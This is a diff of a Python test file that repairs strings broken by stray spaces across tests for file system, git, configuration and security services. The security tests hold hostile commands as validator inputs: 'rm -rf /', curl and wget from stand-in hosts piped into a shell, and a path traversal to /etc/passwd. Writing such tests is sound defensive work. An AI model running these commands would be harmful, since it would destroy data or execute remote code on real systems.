@@ -58,7 +58,7 @@ class TestFileSystemService:
     def test_write_file_success(self, mock_write, fs_service) -> None:
         fs_service.write_file("test.py", "content")
 
-        mock_write.assert_called_once_with("content", encoding="utf - 8")
+        mock_write.assert_called_once_with("content", encoding="utf-8")
 
     @patch("pathlib.Path.write_text")
     def test_write_file_error(self, mock_write, fs_service) -> None:
@@ -196,12 +196,12 @@ class TestGitService:
     @patch("subprocess.run")
     def test_get_remote_url(self, mock_run, git_service) -> None:
         mock_run.return_value = Mock(
-            returncode=0, stdout="https: // github.com / user / repo.git\n"
+            returncode=0, stdout="https://github.com/user/repo.git\n"
         )
 
         url = git_service.get_remote_url()
 
-        assert url == "https: // github.com / user / repo.git"
+        assert url == "https://github.com/user/repo.git"
 
     @patch("subprocess.run")
     def test_is_clean_working_tree(self, mock_run, git_service) -> None:
@@ -246,13 +246,13 @@ class TestConfigurationService:
     def test_read_pyproject_success(self, mock_read, config_service) -> None:
         mock_read.return_value = """
 [project]
-name = "test - project"
+name = "test-project"
 version = "1.0.0"
 """
 
         data = config_service.read_pyproject()
 
-        assert data["project"]["name"] == "test - project"
+        assert data["project"]["name"] == "test-project"
         assert data["project"]["version"] == "1.0.0"
 
     @patch("pathlib.Path.read_text")
@@ -274,12 +274,12 @@ version = "1.0.0"
     def test_get_project_name(self, mock_read, config_service) -> None:
         mock_read.return_value = """
 [project]
-name = "test - project"
+name = "test-project"
 """
 
         name = config_service.get_project_name()
 
-        assert name == "test - project"
+        assert name == "test-project"
 
     @patch("pathlib.Path.read_text")
     def test_get_project_version(self, mock_read, config_service) -> None:
@@ -358,15 +358,15 @@ class TestSecurityService:
         assert result is True
 
     def test_validate_command_unsafe(self, security_service) -> None:
-        result = security_service.validate_command(["rm", " - rf", " / "])
+        result = security_service.validate_command(["rm", "-rf", "/"])
         assert result is False
 
     def test_validate_command_forbidden_patterns(self, security_service) -> None:
         unsafe_commands = [
             ["sudo", "rm", "file"],
-            ["chmod", "777", " / "],
-            ["curl", "http: // malicious.com", " | ", "bash"],
-            ["wget", " - O", " - ", "http: // evil.com", " | ", "sh"],
+            ["chmod", "777", "/"],
+            ["curl", "http://malicious.com", "|", "bash"],
+            ["wget", "-O", "-", "http://evil.com", "|", "sh"],
         ]
 
         for cmd in unsafe_commands:
@@ -404,8 +404,8 @@ class TestSecurityService:
         assert token is None
 
     def test_sanitize_path(self, security_service) -> None:
-        safe_path = " / safe / path / file.txt"
-        unsafe_path = " / safe / path / .. / .. / .. / etc / passwd"
+        safe_path = "/safe/path/file.txt"
+        unsafe_path = "/safe/path/../../../etc/passwd"
 
         assert security_service.sanitize_path(safe_path) == safe_path
         assert security_service.sanitize_path(unsafe_path) != unsafe_path
@@ -437,14 +437,14 @@ class TestSecurityService:
         assert len(hashed) > 0
 
     def test_mask_secrets_in_output(self, security_service) -> None:
-        output = "Password: secret123 and token: abc - def - ghi"
-        secrets = ["secret123", "abc - def - ghi"]
+        output = "Password: secret123 and token: abc-def-ghi"
+        secrets = ["secret123", "abc-def-ghi"]
 
         masked = security_service.mask_secrets_in_output(output, secrets)
 
         assert "secret123" not in masked
-        assert "abc - def - ghi" not in masked
-        assert " *** " in masked
+        assert "abc-def-ghi" not in masked
+        assert "***" in masked
 
 
 class TestInMemoryCache:
